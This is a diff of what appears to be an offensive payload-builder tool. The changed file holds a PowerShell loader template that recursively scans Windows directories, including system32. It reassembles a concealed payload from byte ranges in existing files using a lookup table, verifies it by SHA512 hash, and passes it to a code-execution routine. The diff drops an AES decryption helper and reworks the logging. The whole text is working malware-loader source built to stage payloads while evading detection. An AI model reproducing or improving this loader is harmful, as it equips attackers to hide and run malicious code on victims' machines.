@@ -1,22 +1,8 @@
 buildcode="""
-function Get-DecryptedString($key, $encryptedStringWithIV) {{
-    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
-    #$bytes = $encryptedStringWithIV
-    $IV = $bytes[0..15]
-    $aesManaged = Get-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    $aesManaged.Dispose()
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
-}}
-
 function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
     $sha512 = new-Object System.Security.Cryptography.SHA512Managed
     $end = $payload.Length - $minus_bytes -1
     $compHash = $sha512.ComputeHash($payload)
-    $temp_stuff =  [System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "")
-    write-host $temp_stuff
-    write-host $payload_hash
     if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
         return 1
     }} Else {{
@@ -32,10 +18,11 @@ function Get-CodeExecution($payload, $some_file){{
     $tsize = 0
     $itr = 0
     $decrypted_loader = @()
-    write-host "payload loader length:" $lookup_table.Length
+    write-host "[*] Code Execution"
+    write-host "[**] Code Execution Table Lookup Size:",  $lookup_table.Length
     while($itr -lt $lookup_table.Length){{
         if ($itr % 1000 -eq 0 ){{
-            $itr
+            write-host "[**] Processing : ", $itr
         }}
         $rLoc =  ([Byte[]] $lookup_table[$itr..($itr+2)]) + [Byte[]] 0x00
         $rSz =   ([Byte[]] $lookup_table[($itr+3)]) + [Byte[]] 0x00
@@ -54,10 +41,8 @@ function Get-CodeExecution($payload, $some_file){{
 
 function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternumhash, $minus_bytes, $scan_dir){{
     
-    Write-Host "[*] Hash Iterations: " + $iteration_temp
-        
-    # open file
-    Write-Host "[*] File: " + $some_file
+    Write-Host "[*] File: " , $some_file
+
     try {{
         $read_file = [System.IO.File]::ReadAllBytes($some_file)
         $tLoc = 0
@@ -65,10 +50,9 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
         $tmpstitchCheck = @()
         $itr = 0
 
-        #WTF powershell inclusive arrays too
         while($itr -lt $small_table.Length){{
             if ($itr % 1000 -eq 0 ){{
-                    $itr
+                    write-host "[**] Processing : ", $itr
                 }}
                 
             $tmp1 = $itr+2
@@ -82,10 +66,8 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
             $tsize = 0
             $itr+= 4
         }}
-        #have to get rid of the first value inserted to create the byte array holder
         $stitchCheck = $tmpstitchCheck
-        $stitchCheck.GetType()
-        Write-Host "Length of the Rebuilt Data: ", $stitchCheck.Length
+        Write-Host "[**] Length of the Rebuilt Data: ", $stitchCheck.Length
         #$keyvalue = $read_file[$location..($location + $key_len - 1)]
         #$sha512 = new-Object System.Security.Cryptography.SHA512Managed
         
@@ -97,13 +79,15 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
     $result = Get-CheckHash $stitchCheck $iternumhash 0
 
    ##################################################################
-   #shoul have iterative function here, but not today
+   ## TODO: Recursive Function
+   ##################################################################
+
     if ($result -eq 1){{
-        Write-Host "[*] Short Hashes Match!"
+        Write-Host "[**] Short Hashes Match!"
         Write-Host "[*] Starting Full Hash Match Verification"
             
         # open file
-        Write-Host "[*] File: ", $some_file
+        Write-Host "[**] File: ", $some_file
         try {{
             $read_file = [System.IO.File]::ReadAllBytes($some_file)
             $tLoc = 0
@@ -111,10 +95,9 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
             $tmpstitchCheck = @()
             $itr = 0
 
-            #WTF powershell inclusive arrays too
             while($itr -lt $full_table.Length){{
                 if ($itr % 1000 -eq 0 ){{
-                    $itr
+                    write-host "[**] Processing : ", $itr
                 }}
                 $tmp1 = $itr+2
                 $tmp2 = $itr+3
@@ -127,9 +110,8 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
                 $tsize = 0
                 $itr+= 4
         }}
-        #have to get rid of the first value inserted to create the byte array holder
         $stitchCheck = $tmpstitchCheck
-        Write-Host "[*] Length of the Rebuilt Data: ", $stitchCheck.Length
+        Write-Host "[**] Length of the Rebuilt Data: ", $stitchCheck.Length
         
     }} Catch {{
         return 0
@@ -149,8 +131,6 @@ function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternu
 
 function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir){{
     $dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
-    [Environment]::Is64BitProcess
-    #Select-String -Pattern sysnative
     $sys_paths = @( "c:\", "c:\windows", "c:\windows\system32")
     
     if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
@@ -159,7 +139,6 @@ function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_
 
     foreach ($some_file in $dir_parsing){{
         if ((Get-Item $some_file) -isnot [System.IO.DirectoryInfo] ){{
-            Get-Item $some_file
             if ( (Get-R-Done $some_file $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir) -eq 1) {{
                 break
             }}
@@ -174,16 +153,15 @@ function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_
     $minus_bytes = {4}
 	$scan_dir = "{5}"
 
-    Write-Host "Raw Table " + $lookup_table[0..20]
     $size_init_table = [bitconverter]::ToUInt32($lookup_table[0..3], 0)
     $size_full_table = $lookup_table.Length
 
-    Write-Host "Init (small) Table Size: " + $size_init_table
+    Write-Host "[*] Small (10%) Table Size: " , $size_init_table
+    Write-Host "[*] Full Table Size: " , $size_full_table
 
     $small_table = $lookup_table[4..(($size_init_table*4)+3)]
     $full_table = $lookup_table[4..($size_full_table-1)]
  
-    #Write-Host "Small Table: " , $small_table[0..20]
     if ($scan_dir.Contains("%")){{
         $scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
     }}
